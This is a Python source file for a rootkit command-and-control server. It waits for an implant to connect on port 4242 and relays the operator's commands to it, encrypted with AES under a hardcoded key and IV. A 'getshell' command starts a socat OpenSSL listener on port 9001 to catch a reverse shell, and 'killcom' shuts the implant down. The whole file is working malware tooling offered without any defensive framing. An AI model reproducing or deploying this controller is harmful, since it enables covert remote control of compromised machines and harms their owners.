import socket
import threading
import subprocess
import os
import shutil
import time
from prompt_toolkit import PromptSession
from prompt_toolkit.patch_stdout import patch_stdout

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

# === AES Configuration ===
AES_KEY = b'1234567890abcdef'  # 16 bytes = 128 bits
AES_IV = b'abcdef1234567890'   # 16 bytes = 128 bits


# === Server Configuration ===
HOST = '0.0.0.0'
PORT = 4242
STD_BUFFER_SIZE = 1024

pause_event = threading.Event()
pause_event.set()


# === AES Encryption/Decryption ===
def aes_encrypt(plaintext):
    # Zero-padding
    data = plaintext.encode()
    padding_len = 16 - (len(data) % 16)
    data += b'\x00' * padding_len

    cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted = encryptor.update(data) + encryptor.finalize()
    return encrypted


def aes_decrypt(ciphertext):
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted = decryptor.update(ciphertext) + decryptor.finalize()
    return decrypted.rstrip(b'\x00').decode()


# === Optional: launch a shell via socat ===
def run_socat_shell():
    terminal_cmd = None

    if shutil.which("gnome-terminal"):
        terminal_cmd = [
            "gnome-terminal",
            "--",
            "bash",
            "-c",
            "socat openssl-listen:9001,reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash"
        ]
    elif shutil.which("xterm"):
        terminal_cmd = [
            "xterm",
            "-e",
            "bash -c 'socat openssl-listen:9001,reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash'"
        ]
    elif shutil.which("konsole"):
        terminal_cmd = [
            "konsole",
            "-e",
            "bash",
            "-c",
            "socat openssl-listen:9001,reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash"
        ]
    else:
        print("❌ [!] No compatible terminal found.")
        return

    try:
        subprocess.Popen(terminal_cmd)
        print("🚀 [*] Terminal launched with socat on port 9001.")
    except Exception as e:
        print(f"💥 [!] Error launching socat: {e}")


# === Main server logic ===
def start_server():
    while True:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((HOST, PORT))
        server_socket.listen(1)

        print(f"📡 [*] Waiting for a connection on {HOST}:{PORT}...")

        connection, addr = server_socket.accept()
        print(f"✅ [+] Rootkit connected from {addr[0]}")

        send_result = {}

        # === Thread for sending commands ===
        def send_commands():
            session = PromptSession("🧠 You > ")
            with patch_stdout():
                while True:
                    try:
                        line = session.prompt().strip()
                        if not line:
                            continue

                        # Command: Launch reverse shell
                        if line.lower() == "getshell":
                            threading.Thread(target=run_socat_shell).start()
                            time.sleep(1)

                        # Encrypt and send
                        to_send = aes_encrypt(line + "\n")
                        connection.sendall(to_send)

                        if line.lower() == "killcom":
                            print("❌ [-] Complete shutdown requested by the user.")
                            return 'shutdown'

                    except (KeyboardInterrupt, EOFError):
                        print("\n⚠️ [!] User interruption. Closing...")
                        break
                    except Exception as e:
                        print(f"💥 [!] Error sending: {e}")
                        break

        # === Thread for receiving responses ===
        def receive_responses():
            while True:
                try:
                    data = connection.recv(STD_BUFFER_SIZE)
                    if data:
                        try:
                            decrypted = aes_decrypt(data)
                            print(f"{decrypted.strip()}")
                        except Exception as e:
                            print(f"💥 [!] Decryption error: {e}")
                    else:
                        break
                except Exception as e:
                    print(f"💥 [!] Reception error: {e}")
                    break

        def wrapped_send_commands():
            result = send_commands()
            send_result['status'] = result

        send_thread = threading.Thread(target=wrapped_send_commands, daemon=True)
        receive_thread = threading.Thread(target=receive_responses, daemon=True)

        send_thread.start()
        receive_thread.start()

        send_thread.join()

        connection.close()
        server_socket.close()
        print("🔒 [*] Connection closed. Server stopped.")

        if send_result.get('status') == 'shutdown':
            print("🛑 [*] Global program shutdown.")
            break


# === Entry point ===
if __name__ == '__main__':
    start_server()
